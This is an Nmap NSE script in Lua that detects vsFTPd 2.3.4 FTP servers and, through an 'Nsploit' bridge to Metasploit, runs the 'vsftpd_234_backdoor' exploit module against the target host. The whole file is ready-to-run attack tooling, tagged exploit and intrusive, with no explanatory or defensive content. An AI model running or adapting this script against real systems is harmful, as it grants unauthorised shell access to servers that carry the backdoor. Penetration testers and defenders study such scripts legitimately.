description = [[ Attempts to exploit the vsFTPd 2.3.4 backdoor
]]

author = "Daniel Miller"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit", "intrusive", "malware", "vuln"}

require("shortport")
require "Nsploit"

portrule = function (host, port)
  -- Check if version detection knows what FTP server this is.
  if port.version.product ~= nil and port.version.product ~= "vsftpd" then
    return false
  end

  -- Check if version detection knows what version of FTP server this is.
  if port.version.version ~= nil and port.version.version ~= "2.3.4" then
    return false
  end

  return shortport.port_or_service(21, "ftp")(host, port)
end

action = function(host, port)
  local sock = Nsploit.msfInit()
  local opts = { }
  return Nsploit.exploit(sock, "unix/ftp/vsftpd_234_backdoor", "generic",
    host.ip, opts)
end
